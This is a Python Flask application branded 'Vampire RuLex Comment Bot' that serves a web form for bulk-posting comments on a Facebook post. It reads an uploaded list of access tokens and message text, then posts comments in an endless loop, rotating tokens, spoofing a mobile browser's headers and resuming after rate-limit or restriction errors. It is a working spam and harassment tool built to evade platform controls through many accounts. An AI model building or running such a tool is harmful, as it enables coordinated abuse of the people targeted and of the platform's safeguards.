from flask import Flask, request
import requests
from threading import Thread, Event
import time
import random
import logging

app = Flask(__name__)
app.debug = True

# Headers for Facebook Graph API
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

logging.basicConfig(filename='bot.log', level=logging.INFO)

@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

def send_comments(access_tokens, post_id, prefix, time_interval, messages):
    while not stop_event.is_set():
        try:
            random.shuffle(messages)
            random.shuffle(access_tokens)
            for message in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v20.0/{post_id}/comments'
                    comment = f"{prefix} {message}" if prefix else message
                    parameters = {'access_token': access_token, 'message': comment}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
                        print(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
                    else:
                        logging.error(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
                        print(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
                        if response.status_code in [400, 403]:
                            logging.warning("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
                            print("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
                            time.sleep(300)
                            continue
                    time.sleep(max(time_interval, 120))
        except Exception as e:
            logging.error(f"⚠️ Error in comment loop: {e}")
            print(f"⚠️ Error in comment loop: {e}")
            time.sleep(60)

@app.route('/', methods=['GET', 'POST'])
def send_comment():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()
        post_id = request.form.get('postId')
        prefix = request.form.get('prefix')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_comments, args=(access_tokens, post_id, prefix, time_interval, messages))
            thread.start()
            threads = [thread]

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Vampire RuLex Comment Bot</title>
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@400;500;700&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
      <style>
        :root {
          --bg-dark: #0d0d12;
          --bg-darker: #07070a;
          --accent: #ff2a6d;
          --accent-dark: #d1004d;
          --text: #e0e0e8;
          --text-dim: #a0a0b0;
          --card-bg: #151520;
          --card-border: #252535;
          --input-bg: #1a1a2a;
        }

        body {
          background-color: var(--bg-dark);
          background-image: 
            radial-gradient(circle at 15% 50%, rgba(120, 20, 80, 0.2) 0%, transparent 25%),
            radial-gradient(circle at 85% 30%, rgba(80, 20, 120, 0.2) 0%, transparent 25%),
            radial-gradient(circle at 50% 80%, rgba(160, 30, 90, 0.2) 0%, transparent 25%);
          color: var(--text);
          font-family: 'Rajdhani', sans-serif;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
        }

        .container {
          width: 100%;
          max-width: 400px;
          background-color: var(--card-bg);
          border-radius: 12px;
          padding: 25px;
          box-shadow: 0 0 25px rgba(255, 42, 109, 0.2);
        }

        h1 {
          text-align: center; 
          margin-bottom: 20px; 
          color: var(--accent); 
          font-family: 'Orbitron', sans-serif; 
          animation: glow 2s infinite alternate;
        }

        @keyframes glow {
          from { text-shadow: 0 0 5px var(--accent); }
          to { text-shadow: 0 0 15px var(--accent), 0 0 25px var(--accent-dark); }
        }

        label { color: var(--text-dim); font-weight: 600; margin-top: 10px; display: block; }

        .form-control {
          width: 100%;
          padding: 10px;
          margin-bottom: 15px;
          border-radius: 6px;
          border: 1px solid var(--card-border);
          background-color: var(--input-bg);
          color: var(--text);
        }

        button {
          background: linear-gradient(135deg, var(--accent), var(--accent-dark));
          color: white;
          border: none;
          padding: 12px;
          width: 100%;
          border-radius: 6px;
          margin-top: 10px;
          cursor: pointer;
          transition: all 0.3s;
        }

        button:hover {
          transform: translateY(-3px);
          box-shadow: 0 0 20px var(--accent);
        }

        .footer { text-align: center; margin-top: 15px; color: var(--text-dim); }

        @media (max-width: 768px) {
          .container { padding: 15px; max-width: 95%; }
          h1 { font-size: 1.8rem; }
          .form-control { height: 35px; }
          button { padding: 10px; }
        }
      </style>
    </head>
    <body>
      <h1>💀 Vampire RuLex</h1>
      <div class="container text-center">
        <form method="post" enctype="multipart/form-data">
          <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
          <label>Post ID</label><input type="text" name="postId" class="form-control" required>
          <label>Comment Prefix (Optional)</label><input type="text" name="prefix" class="form-control">
          <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
          <label>Comments File</label><input type="file" name="txtFile" class="form-control" required>
          <button type="submit"><i class="fas fa-play"></i> Start Commenting</button>
        </form>
        <form method="post" action="/stop">
          <button type="submit" style="background:#c00;"><i class="fas fa-stop"></i> Stop Commenting</button>
        </form>
      </div>
      <div class="footer">
        💀 Powered By Vampire RuLex
      </div>
    </body>
    </html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return '✅ Commenting stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
